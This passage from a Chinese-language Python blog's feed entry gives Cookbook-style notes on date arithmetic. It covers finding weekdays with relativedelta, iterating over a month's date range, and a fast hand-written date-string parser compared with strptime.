<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from dateutil.relativedelta import relativedelta</div><div class="line">d = datetime.now()</div><div class="line">print(d + relativedelta(weekday=FR))</div><div class="line">print(d + relativedelta(weekday=FR(-1)))</div></pre></td></tr></table></figure>
<h1 id="计算当前月份的日期范围"><a href="#计算当前月份的日期范围" class="headerlink" title="计算当前月份的日期范围"></a>计算当前月份的日期范围</h1><p><code>calendar.monthrange(year, month)</code>返回该月第一天的weekday和这个月的天数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">def get_month_range(start_date=None):</div><div class="line">    if start_date is None:</div><div class="line">        # 计算出对应月份第一天的日期</div><div class="line">        start_date = date.today().replace(day=1)</div><div class="line">    _, days_in_month = calendar.monthrange(start_date.year, start_date.month)</div><div class="line">    end_date = start_date + timedelta(days=days_in_month)</div><div class="line">    return (start_date, end_date)</div><div class="line">a_day = timedelta(days=1)</div><div class="line">first_day, last_day = get_month_range()</div><div class="line"># 结束日期不包含在日期范围内</div><div class="line">while first_day &lt; last_day:</div><div class="line">    print(first_day)</div><div class="line">    first_day += a_day</div><div class="line"># 或者定义一个生成器</div><div class="line">def date_range(start, stop, step):</div><div class="line">    while start &lt; stop:</div><div class="line">        yield start</div><div class="line">        start += step</div></pre></td></tr></table></figure>
<h1 id="字符串转换为日期"><a href="#字符串转换为日期" class="headerlink" title="字符串转换为日期"></a>字符串转换为日期</h1><p>使用<code>datetime.strptime()</code>方法的性能还是很低的，所以如果知道了日期字符串的确切形式，可以自己实现解析方案来获取更好的性能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from datetime import datetime</div><div class="line">def parse_ymd(s):</div><div class="line">    year_s, mon_s, day_s = s.split(&apos;-&apos;)</div><div class="line">    return datetime(int(year_s), int(mon_s), int(day_s))</div></pre></td></tr></table></figure>
<p>速度比<code>datetime.strptime()</code>快7倍多，6666，把capacity项目的都改过来了</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;执行分数，数组或者日期和时间运算，就需要更多工作，不过这里着重关注日期和时间的运算，毕竟工作上对时间处理还是比较多的。&lt;/p&gt;
&lt;h1 id=&quot;数字的四舍五入&quot;&gt;&lt;a href=&quot;#数字的四舍五入&quot; class=&quot;headerlink&quot; title=&quot;数字的四舍五入&quot;&gt;&lt;/
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
      <category term="Python_Cookbook" scheme="http://microndgt.github.io/tags/Python-Cookbook/"/>
    
  </entry>
  
</feed>
